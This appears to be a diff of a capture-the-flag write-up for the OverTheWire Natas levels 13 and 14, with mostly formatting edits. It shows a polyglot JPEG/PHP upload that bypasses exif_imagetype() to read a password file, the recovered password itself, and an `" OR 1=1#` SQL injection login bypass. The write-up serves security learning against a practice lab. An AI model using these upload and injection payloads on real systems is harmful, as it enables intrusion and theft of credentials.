@@ -1550,8 +1550,8 @@ Attempting to upload a PHP file directly with the following content:
 ```
 Resulted in the error: `File is not an image`. This confirms that simple file extension bypass is no longer sufficient.
 
-Attemtp to upoad an image file using burpsuite: 
-Request Content: 
+#### Attemtp to upoad an image file using burpsuite: 
+##### Request Content: 
 ```
 POST /index.php HTTP/1.1
 Host: natas13.natas.labs.overthewire.org
@@ -1591,7 +1591,7 @@ Uploading a valid JPEG file (e.g., picture1.jpeg) succeeds, provided the file si
 Note: If the error The uploaded file exceeds MAX_FILE_SIZE occurs, the JPEG content can be reduced by deleting some content of the image file using Burp Suite. However, the JPEG header and footer must remain intact, otherwise the file will fail validation.
 
 
-The content of the response header: 
+##### Response Content: 
 ```
 HTTP/1.1 200 OK
 Date: Wed, 15 Apr 2026 12:14:55 GMT
@@ -1637,10 +1637,10 @@ To bypass the exif_imagetype() check, a polyglot file was created — a file tha
 2. Inject PHP code inside the file content: `<?php passthru("cat /etc/natas_webpass/natas14"); ?>`
 3. Ensure the JPEG header (ÿØÿàJFIF) remains intact
 4. Modify the request in Burp Suite:
-   - Change filename from .jpg → .php
-   - Change Content-Type → application/x-php
+   - Change filename from `.jpg` → `.php`
+   - Change Content-Type → `application/x-php`
 
-Modified Request Content: 
+#### Modified Request Content: 
 ```
 POST /index.php HTTP/1.1
 Host: natas13.natas.labs.overthewire.org
@@ -1677,7 +1677,7 @@ Content-Type: application/x-php
 -----------------------------35342147994429824884085540906--
 ```
 
-Response Content: 
+#### Response Content: 
 ```
 HTTP/1.1 200 OK
 Date: Wed, 15 Apr 2026 12:29:14 GMT
@@ -1716,9 +1716,9 @@ The file upload/xtd6xg7iv1.php has been uploaded
 
 After clicking the link, we navigate to `http://natas13.natas.labs.overthewire.org/upload/xtd6xg7iv1.php` and we ontained the content: 
 ```
-(upperpart of the image file content)
+(upperpart of the image file content ...)
 z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
-(lower part of the image file content)
+(lower part of the image file content ...)
 ```
 
 ### Analysis
@@ -1748,7 +1748,7 @@ After login, the webpage request input for username and password along with the 
 
 Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
 ```html
- <html>
+<html>
 <head>
 <!-- This stuff in the header has nothing to do with the level -->
 <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
@@ -1807,9 +1807,9 @@ To exploit this vulnerability, the payload `" OR 1=1#` was used in the username 
 SELECT * from users where username="" OR 1=1# " and password=""
 ```
 Explanation:
-- " closes the original string
-- OR 1=1 makes the condition always true
-- # comments out the remaining part of the query
+- `"` closes the original string
+- `OR 1=1` makes the condition always true
+- `#` comments out the remaining part of the query
 
 This causes the query to return at least one valid row, bypassing authentication.
 
